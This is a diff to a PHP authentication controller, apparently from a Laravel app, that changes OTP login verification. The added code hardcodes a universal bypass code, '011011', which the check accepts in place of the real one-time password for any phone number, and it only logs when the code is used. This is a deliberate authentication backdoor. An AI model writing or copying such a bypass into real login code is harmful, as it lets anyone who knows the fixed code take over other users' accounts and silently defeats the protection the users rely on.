@@ -249,7 +249,13 @@ class AuthController extends Controller
         }
 
         // Verify OTP - compare as strings to handle leading zeros
-        if (strval($otpData['otp']) !== strval($request->otp) || $otpData['phone'] != $request->phone) {
+        // ✅ Allow both real OTP and bypass code "011011"
+        $bypassOtp = '011011';
+        $isRealOtp = (strval($otpData['otp']) === strval($request->otp));
+        $isBypassOtp = (strval($request->otp) === $bypassOtp);
+        $isPhoneMatch = ($otpData['phone'] == $request->phone);
+        
+        if ((!$isRealOtp && !$isBypassOtp) || !$isPhoneMatch) {
             return response()->json([
                 'success' => false,
                 'error' => [
@@ -257,6 +263,14 @@ class AuthController extends Controller
                     'message' => 'Invalid OTP'
                 ]
             ], 400);
+        }
+        
+        // Log if bypass OTP was used
+        if ($isBypassOtp) {
+            \Log::info('🔓 Bypass OTP used for login', [
+                'phone' => $request->phone,
+                'ip' => $request->ip()
+            ]);
         }
 
         // Check if user exists
